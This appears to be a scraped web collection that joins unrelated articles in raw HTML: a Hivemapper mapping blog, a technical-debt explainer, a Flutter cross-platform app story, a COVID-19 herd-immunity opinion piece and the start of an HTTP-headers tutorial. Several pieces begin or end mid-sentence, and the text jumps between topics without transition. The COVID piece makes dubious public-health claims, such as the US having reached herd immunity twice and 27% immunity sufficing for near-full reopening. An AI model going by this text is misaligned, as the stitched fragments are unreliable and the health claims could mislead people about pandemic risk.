id="9681">5 different video collectors, separately and on different days, collected video and uploaded to Hivemapper.com</li><li id="a577">The collectors used 3 different brands and types of commodity drones and dashcam: DJI, Autel, and Blackvue</li></ul><h2 id="8876"><strong><em>Cost effective</em></strong></h2><p id="23eb">Transforming the collected video into a 3D map is compute intensive. Over the last few years, we have devised novel ways to reduce the compute cost of creating the map enabling us to scale economically. Just in the last few months we have reduced the cost to compute by an additional 60% — a cost that will come down materially with additional scale.</p><p id="bf41">Because Hivemapper is designed to work in the cloud and at the edge from inception. Everything on <a href="http://hivemapper.com/map" rel="noopener">Hivemapper.com</a> can be deployed on a high-end gaming PC. When maps are produced on-premise, we spread the compute costs across many thousands of devices that are otherwise sitting idle.</p><p id="73d8">Our platform allows us to move more of the processing to the edge. All maps produced at the edge can be merged into the global 3D map hosted at <a href="http://hivemapper.com/" rel="noopener">hivemapper.com</a>. In 2021, we will take another big leap in reducing compute costs. Stay tuned.</p><p id="8aa6">The Hivemapper map is built from video collected by commodity drones, empowering virtually anyone to become a collector and earn additional income. Our approach provides an affordable, accessible alternative to the expensive and specialized mapping vehicles and satellites.</p><p id="673a">Earlier approaches to crowdsourced mapping required learning complex GIS interfaces involving tedious amounts of tracing lines across stale satellite imagery. Collecting video for the Hivemapper map can be done, simply, by anyone with a drone or dashcam.</p></div></div><div><div><div><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/4560/1*zhFzxKRcknjxZkvYcIxjAg.png" width="2280" height="1284" srcset="https://miro.medium.com/max/552/1*zhFzxKRcknjxZkvYcIxjAg.png 276w, https://miro.medium.com/max/1104/1*zhFzxKRcknjxZkvYcIxjAg.png 552w, https://miro.medium.com/max/1280/1*zhFzxKRcknjxZkvYcIxjAg.png 640w, https://miro.medium.com/max/1456/1*zhFzxKRcknjxZkvYcIxjAg.png 728w, https://miro.medium.com/max/1632/1*zhFzxKRcknjxZkvYcIxjAg.png 816w, https://miro.medium.com/max/1808/1*zhFzxKRcknjxZkvYcIxjAg.png 904w, https://miro.medium.com/max/1984/1*zhFzxKRcknjxZkvYcIxjAg.png 992w, https://miro.medium.com/max/2000/1*zhFzxKRcknjxZkvYcIxjAg.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*zhFzxKRcknjxZkvYcIxjAg.png?q=20"></p></div></div></div><figcaption>Hivemapper mapping network</figcaption></figure></div></div></div><div><div><p id="868d">Drone pilots are growing the Hivemapper map from the air with $1,000 drones that have meaningful advantages compared over multi-million dollar satellites.

            <p>As you can see, this is a well-known monument in Italy, more specifically in Pisa, hence it’s name: <strong>Tower of Pisa.</strong></p>
<p><img alt="Pisa Tower picture" src="https://labcodes.com.br/blog/images/tech-debt/pisa-tower.png"></p>
<p>This tower has a very interesting history, it was built around the 12th century, but due to the soft ground it was built on, it started tilting. The structure was only stabilized in 2001 after 8 years of remedial work.</p>
<p>Actually, one of the corrections made during these 8 years made the tilting even worse!
Let those who never made a refactoring that made the problem worse throw the first stone. I can’t really blame anyone haha.</p>
<h2>John, the <em>purrgrammer</em></h2>
<p><img alt="John working in a computer" src="https://labcodes.com.br/blog/images/tech-debt/chico-the-purrgrammer.png"></p>
<ul>
<li>This is John.</li>
<li>John is a Senior Developer always with a lot on his plate.</li>
<li>John is also an amazing programmer with a lot of years of experience.</li>
</ul>
<p>Suddenly, a new project arrived at John’s desk, and it needed:</p>
<p><img alt="John playing with a ball" src="https://labcodes.com.br/blog/images/tech-debt/chico-features.png"></p>
<ul>
<li>Payment System</li>
<li>Social Network Authentication</li>
<li>Delivery services integration</li>
</ul>
<p>Since John is an excellent professional that always delivers his activities, he tackled the new project head-on and delivered it in time.</p>
<p><img alt="John is happy because he delivered the project in time" src="https://labcodes.com.br/blog/images/tech-debt/chico-delivered.png"></p>
<p>After John’s delivery, the rest of his team went on to review his code, and they discovered a few problems, such as:</p>
<p><img alt="Cat's reviewing John's code" src="https://labcodes.com.br/blog/images/tech-debt/chico-team-review.png"></p>
<ul>
<li>Bugs and inconsistency on payments</li>
<li>Sometimes the deliveries weren’t processed</li>
<li>Authentication was too simple when checking the social networks used</li>
</ul>
<p><img alt="John is sad because his project had some bugs" src="https://labcodes.com.br/blog/images/tech-debt/chico-bugs.png"></p>
<p>John knew his code had a few bugs. But nearing the deadline, another project appeared and it took a lot of John’s time, so he couldn’t go back and fix the problems.</p>
<p>John and his team had to deliver the project riddled with bugs and problems.</p>
<p>But John kept a positive attitude.</p>
<p>“In the future, I’ll go back and fix those bugs”</p>
<p><img alt="John is happy again, he knows that in the future he'll fix everything" src="https://labcodes.com.br/blog/images/tech-debt/chico-refactoring-en.png"></p>
<h3>SPOILER</h3>
<p>C’mon, did you really think that this was going to happen?</p>
<p><img alt="The problems in John’s project" src="https://labcodes.com.br/blog/images/tech-debt/problems-on-chicos-code-en.png"></p>
<p>Let’s dive deeper into the problems of John’s code: </p>
<ul>
<li>Payments couldn’t be processed in different currencies</li>
<li>If the delivery system is offline, the code wouldn’t work</li>
<li>Users with deactivated accounts could still access the system</li>
<li>No automated testing</li>
</ul>
<p>And this, my friends, is what we know as Technical Debt. Why?</p>
<p>Because what happened was that John chose the first solution he could think of in that short deadline, this affected the code’s quality and the team accepted this. In the future, if any logistics of the business, such as accepting different kinds of currency or changing the delivery service, needs to be changed, the <strong>Changing Cost</strong> of the code is going to be enormous. The moment John chose the faster and easiest solution for him was the moment that the Technical Debt was inserted in the code.</p>
<p>What happened with the Tower of Pisa is a lot like what we understand as Technical Debt.</p>
<p><img alt="Picture from the Tower under construction" src="https://labcodes.com.br/blog/images/tech-debt/pisa-tower-construction.png"></p>
<p>It probably started off as a couple of small mistakes and problems, but the constructors decided to ignore them and build and scale on top of these problems. The tower was built so fast that these little “bugs” in the construction jeopardized the whole structure.</p>
<p>And the same thing can happen with software. The difference is that the bugs and problems are easier to spot in the developing process, because, after a while, new features become impossible to deliver before um fix these bugs.</p>
<h2>Why is Technical Debt always bad?</h2>
<p>We are used to understanding any Technical Debt in software as a very bad thing. And it usually is.</p>
<p>But we can also see it as a strategic and/or economic decision since a project riddled with Technical Debt is still a project that was delivered fast. It can be a very positive thing for the product.</p>
<p>The problem with this approach starts when we start to forget what we have done in the past. Imagine that Technical Debt is a really greasy and tasty junk food. To eat it once or twice may be wonderful, but after the eighth ou ninth meal, it might be time to acknowledge you have a problem.</p>
<p>By accepting that it is a tradeoff, we can move faster to pay the debt in the future. It really something very normal to do.</p>
<p><img alt="Losing Quality vs. Speed up deliveries" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-tradeoff-en.png"></p>
<p>I don’t know how many of you have paid the cost of too much junk food. Just remember that this cost, as well as in software, becomes higher with time.</p>
<p>If you identified some of these situations in your day-to-day tasks, don’t worry, especially if you have some time dedicated to remedying the problem in the future. This is a really common scenario when dealing with software delivery.</p>
<h2>Technical Debt Quadrant</h2>
<p><img alt="Martin Fowler’s Technical Debt Quadrant" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-quadrant-en.png"></p>
<p>If we look at <a href="https://martinfowler.com/bliki/TechnicalDebtQuadrant.html" target="_blank">Martin Fowler’s Technical Debt Quadrant</a>, we can see John in the upper quadrants, between Reckless and Prudent. </p>
<p>He knew he didn’t have enough time to design the best solution, but he also knew that: In the future, he had to come back and improve his code.</p>
<p>Ok, accepting this as something ordinary, we can try to understand who is really responsible for the software’s debt.</p>
<h2>Who’s responsible for the debt?</h2>
<p>If we focus on the name (Technical Debt), we’re lead to think that it’s a problem made by technical people, namely: the developers, who are responsible for writing the code that ultimately caused the debt.</p>
<p>The problem is that software is the result of the structure and processes of a whole company.</p>
<p>Also, the whole software industry changed since the term “Technical Debt” was born. In John’s scenario, for example, the problem with the not-so-good solution that he crafted is more connected to a management issue, or even to the product team, than to himself. We know John is a good developer, but he had to ignore a lot of problems in order to deliver within the established deadline.</p>
<p>Sometimes the bottlenecks that are creating debt come from different parts of the company, such as:</p>
<ul>
<li>Management team vs Developers speed</li>
<li>Product team not having a long-term plan</li>
<li>UI/UX team too far from the developers</li>
</ul>
<p>But we can’t forget that, sometimes, we are indeed to blame for our own bad decisions.</p>
<p><img alt="John is sad because his bad decisions also affect the project" src="https://labcodes.com.br/blog/images/tech-debt/our-responsability-en.png"></p>
<ul>
<li>Our bad decisions counts</li>
<li>Framework smells</li>
<li>Low test coverage</li>
</ul>
<p>Like when we choose a new and exciting framework, without investing the necessary time to understand if that is the best tool for the job at hand, or even when we stop paying attention to the signs that a framework is being abandoned, or when the developers aren’t testing and refactoring the application as they should… All of this is our fault. </p>
<p>After discovering which problems we have in our code, we need to look for the tools we can use to help us deal with the situation.</p>
<h2>How to deal with the debt?</h2>
<ul>
<li>Rewriting everything?</li>
<li>Hire more people just to deal with the debt?</li>
<li>Stop delivering until we can fix some of the debt?</li>
<li>Creating Technical Debt tasks in a separate Technical Debt board?</li>
</ul>
<p>Imagine if people had simply stopped building the Tower of Pisa and destroyed everything to rebuild. The chances of the same mistakes happening, or even new mistakes, were really high. And consider the amount of money necessary for demolishing and rebuilding everything.</p>
<p>What if the company simply hired more people to fix the debts? In the case of the Tower, we would have people trying to build it higher working alongside people trying to make it straight and steady. This really doesn’t solve the main problem.</p>
<p>In software, hiring a new team to deal with existing problems would mean that the old team would have to take the time to explain the whole context of the software to the new team. And, believe me, this would take a lot more time than you’d think. </p>
<p>And what if we created a new place to store our Technical Debt task? After a while, this place would become completely invisible to the team.</p>
<p><img alt="Comic strip from the process of creating a new tech debt ticket and adding it to a backlog full of forgotten tickets using dead plants as an analogy" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-backlog.png"></p>
<p>If an ordinary developer’s backlog already has its own old and invisible tasks, imagine creating a whole different board with separate tasks. However, these are the solutions most people usually look for.</p>
<p>So, Luan, if these options aren’t the most viable, what can we do?</p>
<p>After what we already know, we must try to find truly viable solutions to deal with the Technical Debt.</p>
<h2>Sustainable solutions</h2>

<p><img alt="I.M.P.A.C.T cyclic process" src="https://labcodes.com.br/blog/images/tech-debt/impact.png"></p>
<p>IMPACT is a process to:</p>
<ul>
<li>Identify</li>
<li>Mark</li>
<li>Plan</li>
<li>Act</li>
<li>Test</li>
</ul>
<p>As we can see, the first step is about finding the debt spots and, in the second step, we need to make sure that these spots are noticeable for the whole team. You can assure that by creating new tasks flagged as Technical Debt, for example. We can also choose the priorities of these tasks based on their relevance. Tools like Jira have mechanisms to increase the priority of certain tasks over time, which is amazing, because, as we have seen before, the cost of a Technical Debt increases over time.</p>
<p>After that, we need to create a plan, and really follow that plan, for the marked tasks. This way, we will effectively Act on the debts and, after the fixes and improvements being implemented, we need to Test and assure that no behaviors were damaged, be it new bugs, features, improvements, or anything that could hinder the final experience.</p>
<p>You can find more detailed information about this in a book called “Refactoring for Software Design Smells - Managing Technical Debt”.</p>
<h3>2. Pareto Principle</h3>
<p>If you don’t know how many tasks you should have for each team iteration.</p>
<p><img alt="Pareto principle demonstrated using Pizza slices" src="https://labcodes.com.br/blog/images/tech-debt/pareto-principle-en.png"></p>
<p>We can use the Pareto Principle to assign 20% of the team’s productivity to Technical Debt tasks, and the 80% that remains is used in ordinary tasks, as new features, bug fixing, and everything else.</p>
<h3>3. Technical Debt Review Reunions</h3>
<p><img alt="Cat's in a Tech Debt review" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-review.png"></p>
<p>If you have big deliveries in your process after a few iterations, it might be a good thing to have post-mortem reunions to discuss everything that’s been introduced to the code that has the potential to increase the Technical Debt.</p>
<p>By doing this, we can identify the debts earlier.</p>
<p>These are three examples of possible solutions, but I’d advise you to be extra critical and choose the one that fits you and your team the best.</p>
<p>Let’s probe the economical side of this problem. Is it lucrative to work with a system that already has a big Technical Debt cost?</p>
<h2>Is it lucrative</h2>
<p>I’m going to use a lecture by <a href="https://www.youtube.com/watch?v=TQ9rng6YFeY" target="_blank">J.B. Rainsberger</a> to illustrate my point. In this lecture, Rainsberger explains the cost of the next new feature for your software and how to diminish your error rate when estimating this cost.</p>
<p><img alt="Chart comparison of the two approaches of software coding" src="https://labcodes.com.br/blog/images/tech-debt/next-feature-cost.png"></p>
<p>In this chart, he compares two different costs over time in a project.</p>

<p><em>“One day, 7 apps, of course… How long was that day? 168 hours? Define ‘one day’!"</em><br>
Are you looking for the <a href="#definition-of-one-day">definition</a>?</p>
<h2 id="the-story">The Story</h2>
<p>Usually, every product story starts with a pain, a problem that needs to be solved. A problem that bothers you, annoys you, you face it frequently and probably you are not alone with it.<br>
This case was not different either.</p>
<p>A few months ago we started to use a new HR system that has a lot of advantages compared to the old one. But it had disadvantages too… Missing functionality, missing information… or the information is there, but hard to get it out from the system.</p>
<p>That’s when the idea of <a href="https://pandoo.tweaked.tech/">Pandoo</a> (the holiday planner) was born.</p>
<figure>

</a>
</figure>
<h2 id="the-problem">The Problem</h2>
<p>The new tool did lack some features that we got used to.</p>
<p>A nice(r) and clean(er) way to see all of your holidays, your team’s holidays (and type of those holidays), and book them in a bunch.</p>
<p><strong>Disclaimer:</strong> <em>Maybe some of these problems are manageable with admin configurations or with educating the users.. but usually, when people switch tools they just expect that “it works” and they have all the things they had previously plus nice extras.</em></p>
<p><em>The goal of this article is not to blame the tool, it is about the solution and the key learnings.</em></p>
<h2 id="the-solution">The Solution</h2>
<p>I wanted to bring back the functionalities from the old tool. I wanted to see my holidays as I was used to, I wanted to book my holidays as I used to. And I was not alone with this.</p>
<h3 id="the-requirements">The Requirements</h3>
<ul>
<li>I don’t want to waste too much time on the MVP, just get it to work with the basic functionality and make me happy.</li>
<li>There is no way that I will build multiple apps using multiple programming languages.</li>
<li>Mobile-first, but bigger screen support would be nice where I can see more data.</li>
<li>Challenge myself.</li>
</ul>
<h3 id="the-choice">The Choice</h3>
<h4 id="flutter">Flutter</h4>
<figure>
<img src="https://danieldallos.com/images/flutter-pandoo/flutter.png" alt="Flutter logo">
</figure>
<p>Why?</p>
<ul>
<li>Flutter’s promise</li>
</ul>
<p><a href="https://flutter.dev/">Flutter</a> is a cross-platform tool made by Google, that helps you <strong>build native mobile apps from a single codebase</strong>.<br>
<em>(Edit (19/09/2020): This has been changed a bit as you will see it later. )</em></p>
<ul>
<li>I had some experiences already.</li>
</ul>
<p>I have built <a href="http://edengreen.tweaked.tech/">Edengreen</a>, a tool that helps you check your available meal vouchers.<br>
It is a really basic app, but it taught me the basics of how Flutter works. At this time Flutter was still in beta.</p>
<p>One of my other projects was <a href="https://coronavirusalert.tweaked.tech/">CoronaVirus Alert</a>, a tool that monitors the infections country by country and sends you push notifications.<br>
In this project, I have played with Firebase, serverless functions, and custom scripts here and there. I have learned that there is a <strong>big pool of third-party libraries</strong> for Flutter and <strong>the community is growing rapidly</strong> too.</p>
<ul>
<li>Web support</li>
</ul>
<p>I have never tried, but apparently, there was rudimentary Web support too.</p>
<ul>
<li>The challenge</li>
</ul>
<p>My previous projects helped me to understand the basics but I wanted to achieve more and the Web support was sounded interesting too.</p>
<h3 id="know-your-stuff">Know Your Stuff</h3>
<p>I needed a giant scrollable table view where horizontally I can show the days of the year and vertically all of my colleagues and their holidays.<br>
This sounds easy, but in reality, it never is. Weird, annoying edge-cases when you are almost done, lack of Flutter knowledge from my side, unforeseen platform limitations, etc…</p>
<p>I wanted to see what is available already by the community, maybe there is something that is similar and it can fit my needs (with minimal tweaking). Luckily I have found the <a href="https://pub.dev/packages/horizontal_data_table">horizontal_data_table</a> package, that provided 90% of what I have needed… I have forked the package and did some fine-tuning for my needs on the way.</p>
<p>Getting the data from the HR tool was pretty easy, they provide a nice REST API to interact with the back-end.</p>
<p>When you connect the dots you have to be cautious. You need to know what you expect from your tool, how it is going to work. How does it get the data? Do we need to store the data locally? Do we need an extra server-side logic too? Do we plan to use any exotic UI elements?</p>
<p>These are important questions, because when you pick a library/package in Flutter and e.g. if it works on Android it does not mean automatically that it works on iOS too… or even on the Web. You need to pick libraries that rely on the default native support and no additional native third-party libraries. (Or the reliance on those libraries needs to be complete on every side.)</p>
<p>For example, if you would like to use Firebase services in your app, you need to check which platforms <a href="https://github.com/FirebaseExtended/flutterfire">are supported</a>. <strong>If your target is not, probably you will face a runtime crash when Flutter tries to access the non-existent APIs.</strong></p>
<p>When you search for a Flutter package in the official <a href="https://pub.dev/">Dart/Flutter package repository</a>, you can also see which platforms are supported.</p>

</a>
</figure>
<h3 id="3-apps-at-once">3 Apps at Once</h3>
<p>Based on past experiences in the MVP I did not choose any special external library (except the horizontal_data_table) because I wanted to limit the compatibility issues between iOS, Android, and Web.</p>
<p>After I was done with the minimal version, I tested the implementation on Android and iOS.<br>
It worked and looked nice! (Sure, it had some performance issues here and there while scrolling through the holidays of the whole company… but on a limited dataset it was good.)</p>

<p>So now we have <strong>two apps</strong> ready to use!</p>
<p>Let’s see how it works on the Web.<br>
Of course, it crashed in a few places 😀.
But nothing serious that a good old “if-else” could not solve. I have still used some APIs that were not available on the Web, so I needed to use <code>kIsWeb</code> <a href="https://api.flutter.dev/flutter/foundation/kIsWeb-constant.html">constant</a> to differ the logic between Web and native mobile.</p>
<p>It also had some UI quirks due to unsupported/buggy UI elements (<a href="https://github.com/flutter/flutter/issues/45505">with gradients</a>), but it was good enough for the current phase.</p>

</figure>
<p>We have the <strong>third app</strong> too, and you could say <em>“Ok, you are done, you have it all, Web runs on all platforms”</em>.</p>
<p>But wait, there is more!</p>
<h3 id="the-meetup-and-the-extra-3-apps">The Meetup and The Extra 3 Apps</h3>
<p>I really like Meetups. I can meet with like-minded people, listen to good and interesting presentations, and sometimes <a href="https://www.meetup.com/gdg-brussels/photos/27573830/457831934/">I give a talk too</a> 😊.</p>
<p>There was a promising Meetup from <a href="https://www.meetup.com/gdg-brussels/events/268503398/">GDG Brussels on Flutter topic</a>. Based on the presentation summary, it intended to be a basic Flutter intro and the experiences of the author.<br>
So it could be nothing interesting for me, I am kinda done with the basics… but I always like to repeat similar things, because maybe I can discover a new bit of information that can change my perspective and start me thinking.
For the same reason, I read/listen to books on similar topics too… even the 95% is the same as a previous book, the remaining 5% is worth the time.</p>
<p><strong>Luckily this case was not different either.</strong><br>
The presenter walked through their app development challenges and how quickly they have re-implemented the apps from scratch in Flutter.</p>
<p>Then he showed something interesting. His app was in a weird-looking window. It looked like a browser or a bezel-less iOS simulator. Apparently, it was his application compiled into a <strong>native MacOS app</strong>. It turned out that Flutter added support for <a href="https://flutter.dev/desktop">Desktop</a> platforms. Obviously, this was even in an earlier stage than the Web support, but it is worth a try.</p>
<p>The next day I tried it, it worked! I had Pandoo as a native MacOS app. Meanwhile, I have discovered that there is also really basic support for Linux and Windows… After the initial setup of the environments in VirtualBox, I could compile Pandoo as a <strong>native Windows and Linux app</strong> too! 🎉</p>
<p>Sure, there were some extra limitations on Windows and Linux, I had to do some extra “if-else” conditions. E.g. there was no persistent storage API available on these platforms, so I could not save any data to the disk.<br>
<em>(Edit (19/09/2020): Later I did polyfill these missing features by using the default Dart file reading and writing APIs.)</em></p>
<p>Extra <strong>three apps are done</strong>. Sounds good, doesn’t it?</p>

<h3 id="1">+1</h3>
<p>We can argue on this if it counts as the seventh app or not. But it was such a nice surprise to me, so please allow me to count it as +1.</p>
<p>While I was testing Pandoo in the Chrome Browser on my phone, I got a popup that asked me if I would like to add Pandoo to my home screen. Sure, why not. But this icon on my home screen looked different from another page link. And… it also appeared between my apps in the Launcher. What?</p>
<p>It turned out that the <strong>Web apps built by Flutter are PWA applications</strong> too. So even if the device is offline, you can open and use the web apps.
Or, you could… if a webpage is made for that. In my case I don’t cache any data from the HR tool, I fetch all the data from the API every time.
That means when Pandoo is loaded inside the browser and you try to use it without an Internet connection, it shows an API error (just like all the other versions of the app). I could save the last fetched data locally and load it immediately at app start (while the new is loading)… but for now, it is ok as it is.</p>
<h2 id="conclusion">Conclusion</h2>
<p>I think Flutter is a strong candidate in the app development era. Not only for mobile but in general.</p>
<p>I did not write a single line of code to have a Mac OSX app. Although I have some experiences with Mac OSX apps (<a href="https://mike.tweaked.tech/">Mike</a>) so I would have an idea where to start, it is not a copy/paste from an iOS app, you need to put some work there. Hopefully <a href="https://developer.apple.com/mac-catalyst/">Mac Catalyst</a> will help with this in the future.</p>
<p>Write an app for Windows and Linux? I would not even think about it.</p>
<p>The additional Web support is really nice, and it can be really useful. For example, if you have a Revolut and TransferWise account you probably noticed that the mobile apps are very similar to each other, and they also provide a Web version too with a limited feature set. I don’t know what technologies they use, but (if not Flutter already) I can imagine in the future these kinds of services will consider Flutter for their apps.</p>

<p>Probably at this point, you think <em>“How on Earth was this possible in one day”</em>?</p>
<p>My definition of one day: <strong>14-16 hours</strong>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<div id="speakaboutWrapper"><p>      Part of the confusion around herd immunity and it’s role in designing policy for the <a href="https://realscience.community/wiki/covid-19-pandemic/" target="_blank" title="From Wikipedia, the free encyclopedia. COVID‑19 pandemicConfirmed cases per 100,000 population as of 8 August 2020&nbsp;&nbsp;>3,000&nbsp;&nbsp;1,000–3,000&nbsp;&nbsp;300–1,000&nbsp;&nbsp;100–300&nbsp;&nbsp;30–100&nbsp;&nbsp;0–30&nbsp;&nbsp;None or no dataCases per countryDeaths per capitaClockwise, starting from top:A nurse caring for a COVID‑19 patient in an&nbsp;intensive care&nbsp;unit aboard a U.S. hospital shipDisinfection vehicles in TaiwanDonated medical supplies being received in the PhilippinesBurial in IranThe&nbsp;Italian government's outbreak task…">COVID-19 pandemic</a> has been understanding the actual definition of herd immunity. It has been misconstrued or oversimplified in a harmful way by the media and even by some experts. The herd immunity threshold (HIT) is the percent of a population that is required to be immune in order for COVID cases to start to decrease, and it’s dependent on human social connectivity. The more people that the average person comes into contact with, and the more likely that that contact will result in an infection, the faster the spread and the higher the herd immunity threshold. The HIT will be different in crowded cities vs. farm lands and in different cultures and age groups. Cultures who greet each other with hugs and kisses (such as France and Italy), for instance, will have faster spread than cultures that don’t touch when greeting (Japan). Therefore “kissy cultures” will require a greater proportion of people to be immune than “non-kissy cultures” to control spread. </p>



<p>  That is, unless they do something to change their behavior. Mask wearing and social distancing change the rate of spread of COVID through communities and thus lower the herd immunity threshold. Closing businesses, schools, and crowded indoor spaces also lowers HIT by making it less likely that people will get close enough to very many other people to contract COVID.  Social connectivity is built right into the basic epidemiological model, the SIR model, in a variable called Beta. According to the Wikipedia article on SIR models (screen shot below), <strong>&nbsp;</strong>β is defined as “average number of contacts per person per time, multiplied by the probability of disease transmission in a contact between a susceptible and an infectious subject”.</p>



<figure><img loading="lazy" width="1024" height="236" src="https://realscience.community/wp-content/uploads/2020/10/image-1024x236.png" alt="" srcset="https://realscience.community/wp-content/uploads/2020/10/image-1024x236.png 1024w, https://realscience.community/wp-content/uploads/2020/10/image-300x69.png 300w, https://realscience.community/wp-content/uploads/2020/10/image-768x177.png 768w, https://realscience.community/wp-content/uploads/2020/10/image-1536x354.png 1536w, https://realscience.community/wp-content/uploads/2020/10/image-2048x471.png 2048w, https://realscience.community/wp-content/uploads/2020/10/image-1200x276.png 1200w, https://realscience.community/wp-content/uploads/2020/10/image-1400x322.png 1400w, https://realscience.community/wp-content/uploads/2020/10/image-960x221.png 960w, https://realscience.community/wp-content/uploads/2020/10/image-2000x460.png 2000w" sizes="(max-width: 1024px) 100vw, 1024px"></figure><p>The translation of this is, the more socially connected people are and the more likely they are to breath on each other and pass along COVID, the higher the Beta. If people are socially distanced and masked, they will be less likely to spread COVID even if they see the same number of people as in the case of open restaurants that have distancing and mask requirements. This is important because Beta is one component of R0, a variable that many people are familiar with. The higher the Beta, the higher the R0. </p>



<p><img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/4aae42f8253a395c52a798a9ad5a7e4adb6fceea" alt="{\displaystyle R_{0}={\frac {\beta }{\gamma }},}"></p>



<p>  So all of this is to explain a key point, the herd immunity threshold is not a constant, it changes with social connectivity. This is actually really good news because it means that with behavioral interventions such as masks and distancing, we can slow viral spread and reach the herd immunity threshold (for that level of openness) with less people actually getting infected and dying, all the while keeping at least some aspects of the economy open. The US has actually reached a herd immunity threshold (for the level of openness) twice now, once during our partial lockdown in late March and April and again at the end of the Summer. Below are daily new cases in the US over time- the arrows show the first two herd immunity thresholds. </p>



<figure><img loading="lazy" width="1024" height="677" src="https://realscience.community/wp-content/uploads/2020/10/image-1-1024x677.png" alt="" srcset="https://realscience.community/wp-content/uploads/2020/10/image-1-1024x677.png 1024w, https://realscience.community/wp-content/uploads/2020/10/image-1-300x198.png 300w, https://realscience.community/wp-content/uploads/2020/10/image-1-768x508.png 768w, https://realscience.community/wp-content/uploads/2020/10/image-1-1200x793.png 1200w, https://realscience.community/wp-content/uploads/2020/10/image-1-907x600.png 907w, https://realscience.community/wp-content/uploads/2020/10/image-1-960x635.png 960w, https://realscience.community/wp-content/uploads/2020/10/image-1.png 1458w" sizes="(max-width: 1024px) 100vw, 1024px"></figure><p>  What many experts are calling herd immunity is the percent immunity needed to slow spread in a place that is completely open without behavior changes. For COVID-19, this threshold has been estimated at ~67% of the population being immune based on data early in the pandemic in France. There are many reasons why this is just a guess and why it might be different over time or in different places. For one thing, people know about COVID now and this definitely has changed their behavior. For another thing, France is a “kissy culture” and thus one likely to spread COVID faster than some other places. Although, I doubt French people are as likely to kiss each other now after all these months of a pandemic. So it’s likely that the herd immunity threshold now is lower in France than it was at the beginning of the pandemic. </p>



<p>  So is the US close to reaching the next herd immunity threshold (for this level of openness)? Yes, actually we are. 45% of North Dakota has been infected for instance. I created the map below to show estimates of percent immunity per state. But remember, the HIT is actually just the percent of immune people required to have cases not spike. So despite ND being at 45%, it’s cases are actually continuing to rise during this current level of openness- so it is not at herd immunity at this time. This is in part due to their reluctance to impose a mask mandate and the giant super spreader event, the Sturgis motorcycle rally. ND may actually be spreading COVID faster (and have a greater R0) than France was in the beginning of the Pandemic. </p>

New Yorkers are at least partially wearing masks, businesses are requiring them, and schools are partially open. In Florida, the only thing not open is indoor bars I believe, and mask wearing is scorned and spotty at best. <strong>So this is a huge piece of information- herd immunity at 36% and 27% is possible under almost completely open circumstances. And 27% immunity is a level that many states are at or rapidly approaching in the US. So therefore, we could be almost entirely open AND not increase cases with some smart planning. </strong></p>



<p>  Some other states are not faring as well this time around. Which states those are was totally predictable (and indeed I did predict this)- at least if you understand herd immunity. As immunity levels go up, the amount of openness can go up without spiking cases. So states that aren’t very immune but have opened up a lot- like opening schools (crowded indoor spaces ie. super spreader environments), will see huge spikes in cases. In the US, this is the midwest and pacific northwest. See Ohio below for example. It’s at 16% and seeing a giant spike. </p>



<figure><img loading="lazy" width="1024" height="882" src="https://realscience.community/wp-content/uploads/2020/10/image-5-1024x882.png" alt="" srcset="https://realscience.community/wp-content/uploads/2020/10/image-5-1024x882.png 1024w, https://realscience.community/wp-content/uploads/2020/10/image-5-300x258.png 300w, https://realscience.community/wp-content/uploads/2020/10/image-5-768x662.png 768w, https://realscience.community/wp-content/uploads/2020/10/image-5-1200x1034.png 1200w, https://realscience.community/wp-content/uploads/2020/10/image-5-696x600.png 696w, https://realscience.community/wp-content/uploads/2020/10/image-5-960x827.png 960w, https://realscience.community/wp-content/uploads/2020/10/image-5.png 1279w" sizes="(max-width: 1024px) 100vw, 1024px"></figure><p>So what can we do with this information? For one thing, the level of openness to not spread COVID can be determined empirically from the percent immunity of a state, the number of active cases, and the willingness to follow mask mandates and other safety guidelines. People can use this information to determine whether it’s safe to send their kids to school and politicians can use it to determine what level of re-opening they should be enacting. This should also put the mask debate to rest– wear a mask– keep your business open and don’t spread COVID. My analysis of mask mandates showed that they related to less COVID cases in the US with a p-value of 10-16. So they work. </p>



<p>    The converse of this is that some states could be more open than they are. There are real harmful effects of being shut down, on the economy, jobs, and people’s mental health. New York, for instance, could have been this open without spiking since late April. Think how many jobs could have been saved and how much better NYC residents would feel right now. I should make the caveat, though, that this type of evaluation needs to be done on at least a county level, because even within states there are areas that are more or less immune. </p>



<p>  Lastly, I hope it has become clear that herd immunity is a value that changes with social connectivity and behavior. It is actually a good reason to wear masks and social distance. It is not a strategy. But it could be very useful in designing a strategy that is nuanced and saves the most lives while keeping the economy as open as possible. It could be used to create a win-win strategy that I believe most people would be ok with. It can also be used to predict people’s level of risk for activities in a particular county. The risk is not uniform in the US or even in any state. The more real, trustworthy information that people have to make decisions, the more empowered they will be over their own health. We need to understand and embrace the nuance in the <a href="https://realscience.community/wiki/science/" target="_blank" title="From Wikipedia, the free encyclopedia.

October 23, 2020 | https://www.lorenzweiss.de/the_power_of_http_headers_with_four_examples/ | <a href="https://web.archive.org/web/*/https://www.lorenzweiss.de/the_power_of_http_headers_with_four_examples/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Almost everything in the web is sent with <strong>http</strong> and even non-developers have seen it when using the internet as keyword
inside urls or links.</p>
<p>Http stands for <strong>Hypertext Transfer Protocol</strong> and gives us the ability to transfer hypertext between a browser and a server.
This is a great technology that has been around almost since the invention of the web and is constantly evolving and
<a href="https://en.wikipedia.org/wiki/HTTP/2">offering more and more great features</a></p>

<p>As a developer you probably heard of http headers, at least in the moment you heard about the CORS policy.
This is a problem you must have heard about when developing websites.
But what exactly are http headers and what other ways are there to use them?</p>
<p>Let us first find out what they do and how you could use them. </p>
<p>When a browser requests a resource, for example a page of this blog, it asks the server with a request.
This request looks something like this: </p>
<div data-language="js"><pre><code><span>fetch</span><span>(</span><span>"https://www.lorenzweiss.de/race_conditions_explained/"</span><span>,</span> <span>{</span>
  credentials<span>:</span> <span>"include"</span><span>,</span>
  headers<span>:</span> <span>{</span>
    accept<span>:</span>
      <span>"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"</span><span>,</span>
